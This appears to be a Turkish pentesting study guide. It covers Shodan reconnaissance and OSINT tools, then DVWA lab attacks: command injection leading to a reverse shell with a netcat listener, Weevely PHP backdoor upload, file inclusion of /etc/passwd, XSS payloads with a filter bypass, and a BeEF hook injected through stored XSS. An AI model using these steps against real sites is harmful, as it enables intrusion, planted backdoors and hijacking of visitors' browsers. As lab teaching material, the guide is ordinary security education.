Shodan Bilgi Toplama ve Arama Motoru'dur

1. Google'dan ```shodan.io``` adresine giriyoruz
2. ```webcams``` yazarak daha önceden taglanmiş kameraları görebiliriz 
3. ```vsat``` yazarak daha önceden taglanmiş uyduları görebiliriz
4. Çıkan IP'lere tıklayarak kullanılan portları görebiliriz ```(e.g. 123.456.789.123:9000) 9000 portunu kullanıyor```

### Shodan İçerisinde Filtreleme 

* ```vsat port:80```: Port 80 çalıştıran web'e çıkış veren uyduları gösterir
* ```port:22```: SSH Kullanan Servisleri Listeleriz
* ```port:22 country:"FR" city:"Paris"```: Fransa Parisdeki SSH Sunucularını Listeler
* ```os:"Windows XP"```: Windows XP kullanan PC'leri Listeler
* ```os:"Windows XP" country:"US"```: ABD'de Windows XP kullanan PC'leri Listeler
* ```vsftpd 2.3.4```: ftp 2.3.4 Kullanan Servisleri Gösterir

### Shodanı Terminal Üzerinden Çalıştırmak

1. ```shodan```
2. ```shodan init <API key>``` (IP key shodan sitesinde hesabımıza tanımlanmış key)
3. ```shodan host 123.456.789.123``` (Arama yapmak istediğimiz sunucu vs. IP'si)

# 19-Bilgi Toplama

### Maltego

* Arama yapmak istediğimiz şeyi seçip isimini yazarak arama yapabiliriz
* Arama sonucuna göre örneğin ```wordpress``` kullanıyorsa ```wordpress exploit``` google'layarak bilinen açıkları ve nasıl kullanıcağını görebiliriz

### Netcraft

* Netcraft'ın sitesine giderek bilgi toplayabiliriz
* Webtrackerları, kullanılan teknolojileri(php,xml vs.), risk değelerini vs görebiliriz
* HTTP mi yoksa HTTPS mi öğrenebiliriz

### Yougetsignal

* Youtgetsignal aynı IP adresini kullanan websitelerini gösterir (Reverse IP)
* ```Reverse IP: Web sitesinden IP adresinde değil, IP adresinden Websitesine gidiş```
* Aynı IP adresinde çalışan başka bir websitesini hackleyerek diğer websitesinin bilgilerine erişebiliriz
* Bundan korunmak için kendimize ait bir serverimizin bulunması lazım
* ```ip:123.456.789.123 (IP adresi)``` şeklinde aratarak o websitesiyle aynı IP adresini kullanan siteleri buluruz

### Archive 

* Websitelerinin eski hallerini arşivleyen sitedir

### Whoislookup 

* (I CANN WHO IS)
* Temel bilgileri (Register bilgileri, contact numaraları vb.) görebiliriz 
* Ne zaman ve nereden alındığını görebiliriz

### Robots.txt 

* ```dirb http(s)://<IP>/``` yazarak websitesi içine gizlenmiş dosyaları listeleriz(e.g. http://<IP>/multilliade/)
* Liste içierisinde  (e.g. http://<IP>/multilliade/robots.txt) linkini google'da aratarak robots içindekileri görürüz
* ```robots.txt``` içindeki komutları link sonuna ekleyerek istediğimiz gizli uzantılara girebiliriz(e.g. http://<IP>/mutillidae/passwords/)

### Subbrute 

* ```git clone https://github.com/TheRook/subbrute``` çalıştırıp kaydettiğimiz klasöre gidiyoruz
* ```python3 subbrute.py siteadı.com``` diyerek belirtilen sitenin subdomainlerini(alt domain) görebiliriz
* Çıkan subdomainlere giderek ```SQL enjeksiyon``` deneyebiliriz
* Çıkan subdomainlere ```nmap``` çalıştırabiliriz

# 20-Web Pentesting
  
### DVWA 

* metasploitable2 IP adresini Kali üzerinden açıyoruz (Username:admin Password:password)

![](https://github.com/ahmetnuysal/Cyber-Security/blob/e4dd237223d366719e2b6bb6e3e10232ab630e4d/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2014.31.46.jpeg)

* Command execution kısmına giriyoruz, bu kısımdan siteye form yollayabiliriyoruz
* IP adresimizin sonunda Linux komutları çalıştırmayı deniyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/42e3c1f9c825f1c1462ccc16069e42bc305cf071/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2014.35.42.jpeg)

* Komutu çalıştırabildik                                                

![](https://github.com/ahmetnuysal/Cyber-Security/blob/dfd38c27ffc53942cfde3fcca7d8f7011bdcdb3e/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2014.39.14.jpeg)

* Google'a ```reverseshell commens``` yazarak komutları arıyoruz
* Bulduğumuz komutları IP'mizin sonuna ekleyerek çalıştırıyoruz
* Aynı zamanda ```msfconsole``` çalıştırarak dinlemeye başlıyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/1e6067bcbb08a3c6085b8b4bb1da5cdaf0fa6ea3/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2014.42.00.jpeg)

### NATCAT ile Dinleme

```nc -vv -l -p 5050``` Natcat ile port dinlemesi yapmamızı sağlar
```connect to 123.123.123.123 from UNKKNOWN...``` bağlanıldı demektir
```
-vv: Detaylı Bilgi Verir
-l: Dinleme Modunu Açar
-p XXXX: Hangi Porttan Dinleyeceğimizi Seçeriz
-e: Dosya Aktarımında Kullanılır
-v: Detay Verir
```  

### Weevely

1. ```.php``` kullanarak backdoor trojan oluşturmamızı sağlar
2. ```weevely generate 11111 /root/myconnection.pnp``` şifremizi ve trojan'in kaydedileceği konumu yazıyoruz
3. Sitemizin upload yapabileceğimiz kısımını açıyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/2ac777e091178628c515e1eb99546fe3aa5ed7d8/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2018.51.59.jpeg)

4. Oluşturduğumuz php dosyasını upload ediyoruz
5. ```weevely http://<IP>/../../uploads/myconneciton.php 11111``` yazarak session içine gireriz ve gezinebiliriz

### File Inclusion

1. Linkde bulunan ```?page=``` kısımını siliyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/34f3233fa792bbc0248640ebbd33a03d40ab5fc0/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-29%20at%2018.56.58%20(1).jpeg)

2. Link'in sonuna ```?page="var/www/dvwa/vulnerabilities/fi/include.php"``` ekliyoruz
3. Link sonundaki ```include.php``` kısımından silmeye başlayarak geri gidebiliriz 
4. Ya da gitmek istediğimiz yeri link sonuna ekleyebiliriz ```e.g. http://123.123.124.123/dvwa/vulnerabilities/fi/?page=/etc/passwrd```

### Nikto 
  
```nikto -h <site URL'si> ``` site ile ilgili tarama yapar  

# XSS Açıkları
  
XSS açıkları site içinde JS kodu çalıştırabiliyoruz demektir

### XSS
  
1. Site ile etkileşime girebileceğimiz bir yere giriyoruz (form vb.)
2. ```<script>alert("XSS Açığı")</script>``` kodunu yazarak deneme yapıyoruz
3. Eğer açık var ise, bu JS kodunu siteye giren herkesin görebileceği bir kısıma yazarsak siteye giren herkesin ekranına bu bildirim düşer
4. ```<script>window.location='https://google.com'</script>``` kodunu yazarsak siteye giren herkesi otomatik olarak belirtilen siteye yönlendirir (bu kod için google'a)
5. Bazı sitelerde ```JavaScript``` filtreleri bulunur, bu filtrelerden kaçmak için ```<scr<script>ipt>alert("XSS Açığı")</scr</script>ipt>``` şeklinde yazarız

### XSS Reflected

Bir link oluşturmamız gerekiyor 

Site içinde site ile etkileşime girebileceğimiz yer arıyoruz 

![](https://github.com/ahmetnuysal/Cyber-Security/blob/b8d58a9d2f710cb023f9ac0dbb2d83c22e457eba/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2013.39.08.jpeg)

Bu kısıma ```<script>alert("ı hack you")</script>``` yazıyoruz ve submit ediyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/f7a0ec1433d1e05fd007503381c54e818cfce8e6/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2013.42.12.jpeg)

Eğer birisine sitenin ```url```sini yollarsak yolladığımız kişininde ekranında bu bildirimi görürüz

### XSS Stored

Bu sefer form siteleri benzeri bir etkileşim yeri buluyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/41454e2cfb3fb9afae9f262e08f50311f927397e/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2014.03.03.jpeg)

Rastgele bir isim giriyoruz, mesaj kısmına ```<script>alert("ı hack you")</script>``` yazıyoruz ve submit ediyoruz

![](https://github.com/ahmetnuysal/Cyber-Security/blob/9991c76b35828899d62e508174455d796dc28ba0/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2014.05.40.jpeg)

Mesajımızı siteye giren herkes göreceği için bu sayfaya giren herkesin ekranında ```ı hack you``` mesajı görülecek

![](https://github.com/ahmetnuysal/Cyber-Security/blob/f7a0ec1433d1e05fd007503381c54e818cfce8e6/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-08-30%20at%2013.42.12.jpeg)

> ### XSS Stored ve Beef Çalıştırma

```beef-xss``` ile beef'i açıyoruz
```example``` kısmınıdaki ```<script src="http://.../hook.js"></script>```kodunu kopyalıyoruz ve sitemize geri dönüyoruz
Bu kodu mesaj kısımına yapıştırıp submit ediyoruz
Artık bu siteye giren herkes hook'umuza takılmış olucak ve ```beef``` üzerinden bize görünür olucak

### XSS'den Korunmak İçin
 
Google -> Ayarlar -> Gizlilik ve Güvenlik -> Site Ayarları -> JavaScript 

Varsayılan durumunu kapatıp sadece güvendiğimiz siteleri listeye eklemeliyiz
